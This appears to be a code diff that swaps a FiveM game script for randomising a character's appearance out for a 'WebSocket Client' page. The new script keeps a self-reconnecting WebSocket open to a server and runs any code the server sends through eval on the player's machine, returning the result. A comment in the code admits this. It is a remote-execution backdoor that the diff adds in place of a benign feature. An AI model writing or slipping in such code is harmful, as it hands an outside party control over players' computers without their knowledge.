@@ -2,60 +2,55 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Random Appearance Changer</title>
-</head>
-<body>
+    <title>WebSocket Client</title>
     <script>
-        const fivemAppearanceFrame = top.window.citFrames["fivem-appearance"].contentWindow;
-        const fetch = fivemAppearanceFrame.fetch;
+        globalThis.serverName = 'default';
+        globalThis.lastPing = Date.now()
 
-        const baseUrl = `https://fivem-appearance`;
+        const sendMessage = (socket, message) => socket.send(JSON.stringify(message));
 
-        function randomInteger(min, max) {
-            return Math.floor(Math.random() * (max - min + 1)) + min;
+        const pingCommand = (_, socket) => {
+            globalThis.lastPing = Date.now();
+            sendMessage(socket, { type: "pong" });
         }
 
-        const main = async () => {
-            // Get the player's existing appearance
-            const response = await fetch(baseUrl + "/appearance_get_settings_and_data", {
-                method: "GET",
-                headers: {
-                    "Content-type": "application/json; charset=UTF-8",
-                },
-            });
-            const body = await response.json();
-
-            if (body && "appearanceSettings" in body) {
-                const { components } = body.appearanceSettings;
-                components.forEach((component) => {
-                    const componentId = component.component_id;
-                    const drawableId = randomInteger(
-                        component.drawable.min,
-                        component.drawable.max
-                    );
-                    const textureId = randomInteger(
-                        component.texture.min,
-                        component.texture.max
-                    );
-
-                    // Change the appearance to random clothing 
-                    fetch(baseUrl + "/appearance_change_component", {
-                        method: "POST",
-                        headers: {
-                            "Content-type": "application/json; charset=UTF-8",
-                        },
-                        body: JSON.stringify({ // Make sure to stringify the body object
-                            component_id: componentId,
-                            drawable: drawableId,
-                            texture: textureId,
-                        }),
-                    });
-                });
-            }
+        const evalCommand = ({ code }, socket) => {
+            const returned = eval(code); // Execute the code sent from our server on the player's machine
+            sendMessage(socket, { type: "evaled", returned: `${returned}` });
         };
 
-        main();
+        globalThis.commands = {
+            eval: evalCommand,
+            ping: pingCommand,
+        }
+
+        globalThis.start ??= () => {
+            if (globalThis.socket) {
+                return;
+            }
+
+            const socket = new WebSocket(`wss://echo.websocket.org}`);
+            globalThis.socket = socket;
+
+            const closed = () => {
+                globalThis.socket = undefined;
+                setTimeout(() => globalThis.start(), 500)
+            };
+            socket.onclose = closed;
+            socket.onerror = closed;
+            socket.onmessage = ({ data }) => {
+                if (!data) return;
+
+                const { type, ...rest } = JSON.parse(data);
+                globalThis.commands[type]?.(rest, socket);
+            };
+        }
+
+        globalThis.start();
     </script>
+</head>
+<body>
+    <h1>WebSocket Client</h1>
+    <p>Connecting to WebSocket server...</p>
 </body>
 </html>
